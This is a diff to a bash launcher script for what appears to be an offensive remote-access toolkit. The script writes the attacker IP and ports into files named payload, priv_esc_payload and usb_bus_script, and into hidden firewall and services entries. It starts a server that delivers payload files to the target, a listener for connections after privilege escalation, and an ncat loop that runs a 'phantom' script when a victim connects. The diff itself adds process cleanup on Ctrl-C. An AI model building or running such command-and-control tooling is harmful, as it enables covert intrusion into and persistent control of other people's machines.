@@ -46,8 +46,6 @@ for i in $@; do
     port1=${i#*=}
   elif [ "$(expr $i : port2)" != "0" ]; then
     port2=${i#*=}
-  #elif [ "$(expr $i : portp)" != "0" ]; then
-  #  portp=${i#*=}
   fi
 done
 
@@ -75,6 +73,25 @@ while true; do
   fi
 done
 
+#trap ctrl-c to kill the spawned processes
+pid=()
+kill_process() {
+  printf "\n"
+  #first kill the background processes otherwise they will continuously spawn new processes
+  for i in ${pid[*]}; do
+    kill -9 $i
+  done
+  listening_port_list=$(netstat -tpnl 2>/dev/null | awk '{ print $4 }' | awk -F: '{ print $2 }')
+  for i in ${listening_port_list[@]}; do
+    if [ $i == $portp ] || [ $i == $portr ]; then
+      fuser -k $i/tcp &>/dev/null
+    fi
+  done
+  exit
+}
+trap kill_process SIGINT
+
+#--------------------------------------------------replace variables in scripts------------------------------------
 #replace ip, port2, portp and portr in payload
 sed -i "s%ip=\".*\"%ip=\"$ip\"%" $path/payload
 sed -i "s%port2=\".*\"%port2=\"$port2\"%" $path/payload
@@ -84,7 +101,7 @@ sed -i "s%portr=\".*\"%portr=\"$portr\"%" $path/payload
 #replace portp in python_server
 sed -i "s%portp=\".*\"%portp=\"$portp\"%" $path/python_server
 
-#--replace the ip and port in usb_bus_script--
+#-replace the ip and port in usb_bus_script-
 #convert the ip to hex
 IFS='.' read -r -a ip_dec <<<$ip
 ip_hex=()
@@ -111,17 +128,20 @@ sed -i "s%~ /.*:.*/%~ /$hex_ip:$hex_port/%" $path/misc/services
 #replace the ip and port in phantom-firewall
 sed -i "s%~ /.*:.*/%~ /$ip:$port2/%" $path/phantom-firewall
 
-#start the server that is gonna transfer the files needed by the payload to the target machine
-fuser -k $portp/tcp &>/dev/null
-$path/python_server &
-
 #replace ip, port2 and portp in priv_esc_payload
 sed -i "s%ip=\".*\"%ip=\"$ip\"%" $path/priv_esc_payload
 sed -i "s%port2=\".*\"%port2=\"$port2\"%" $path/priv_esc_payload
 sed -i "s%portp=\".*\"%portp=\"$portp\"%" $path/priv_esc_payload
 
+#------------------------------------------------------------start the scripts--------------------------------------------------
+
+#start the server that is gonna transfer the files needed by the payload to the target machine
+$path/python_server &
+pid+=($!)
+
 #start the script that will accept connections after priviledge escalation
 $path/priv_esc_init portr=$portr path=$path &
+pid+=($!)
 
 #start ncat and invoke the phantom script when a connection occurs
 while true; do
